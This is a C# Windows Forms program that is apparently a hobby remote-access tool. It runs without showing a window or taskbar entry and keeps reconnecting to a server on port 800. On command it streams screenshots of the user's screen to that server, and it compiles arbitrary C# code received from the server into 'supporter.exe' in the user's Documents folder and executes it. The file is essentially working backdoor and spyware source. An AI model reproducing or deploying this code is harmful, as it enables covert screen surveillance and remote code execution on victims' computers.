using System;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;

namespace WindowsFormsApp2
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.ShowInTaskbar = false;
        }



        private void Form1_Load(object sender, EventArgs e)
        {
            Socket LocalClient = ServerConnecting(null, null); // ServerConnectiong() -- is a function that connects the server.
                                                      // everytime that the connection lost, this function will called.
                                                      // its a loop function that saves the connection to server


            client(LocalClient); //will run without a thread because I dont want the winform GUI to load
                                 //(I think it is very smart more), this program using Winform because It have more
                                 //futures than console app.
        }




        static Socket ServerConnecting(Socket LocalClient, IPEndPoint iep)
        {

                try
                {
                    LocalClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    iep = new IPEndPoint(IPAddress.Parse("127.0.0.1"), int.Parse("800"));
                }
                catch { }

            while (true) //if the server not available it will try again
            {
                try
                {
                    LocalClient.Connect(iep);
                    break;
                }
                catch { }
            }

            return LocalClient;
        }



        public void client(Socket client)
        {

            void CheckingConnection() //function that works at a loop. trying everytime to send messages, when it failed,
                                      //then the connection is lost and false will returned. the
                                      //code will use the "false" respone to make a call to ServerConnectiong() function.
            {
                    try
                    {
                        client.Send(Encoding.ASCII.GetBytes(""));
                    }
                    catch
                    {
                    //something that will renew the connection
                    client = ServerConnecting(null, null);
                }
            }



            string receiving_messages() //function that works at a loop, everytime receiving messages from server.
            {
                int size = 0;
                byte[] msg = new byte[1024];

                try
                {
                    size = client.Receive(msg);
                    string message = Encoding.ASCII.GetString(msg, 0, size);
                    return message;
                }
                catch
                {
                    //something that will renew the connection
                    client = ServerConnecting(null, null);
                    return "";
                }

            }



            while (true)
            {

                    CheckingConnection(); //while loop, everytime it starts from beggining
                                          //it will use the connection test function.

                    string message = receiving_messages(); //using the function that receiving messages

                    if (message == "logout")
                        break;

                    if (message.StartsWith("command"))
                    {
                    message = message.Replace("command", "");
                        run_command(message);
                    }

                    if (message == "ScreenShare")
                    {

                        while (message != "abort") //when the server closing the GUI menu of the remote
                                                   //screen "abort" will be sent to client
                        {
                            message = receiving_messages();
                            message = message.Replace("x", "");

                            threadimage();

                            Bitmap GetScreen()
                            {
                                Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                                Graphics g = Graphics.FromImage(bitmap);
                                g.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                                return bitmap;
                            }

                            void threadimage()
                            {
                                try
                                {
                                    MemoryStream ms = new MemoryStream();
                                    GetScreen().Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);

                                    client.Send(ms.ToArray());
                                    ms.Close();

                                }
                                catch
                                {
                                    message = "abort";
                                }

                            }

                        if (message == "abort")
                            break;


                        }
                    }

            }
            Environment.Exit(0);









            void run_command(string command) //running C# code from string that sent from server
            {

                string CodeAsString = @"using System; using System.IO; using System.Text; using System.Threading.Tasks; using System.Runtime.Serialization.Formatters.Binary; using System.Runtime.InteropServices; using System.Threading; using System; using System.Collections.Generic; using System.Diagnostics; using System.IO; using System.Net; namespace MainProcess { class Program { static void Main(string[] args){" + command + "}}}";


                CSharpCodeProvider codeProvider = new CSharpCodeProvider();
                ICodeCompiler icc = codeProvider.CreateCompiler();
                System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
                parameters.GenerateExecutable = true;
                parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
                parameters.ReferencedAssemblies.Add("System.dll");
                parameters.ReferencedAssemblies.Add("System.Diagnostics.Process.dll");
                parameters.CompilerOptions = "/t:winexe";
                parameters.OutputAssembly = @"C:\Users\" + Environment.UserName + @"\Documents\supporter.exe";
                CompilerResults results = icc.CompileAssemblyFromSource(parameters, CodeAsString);
                
                if (results.Output.Count > 0)
                {
                    Console.WriteLine("");
                }
                else
                {
                   Process.Start(@"C:\Users\" + Environment.UserName + @"\Documents\supporter.exe");
                }
            }





        } // closing of the thread that called "client"


    }
}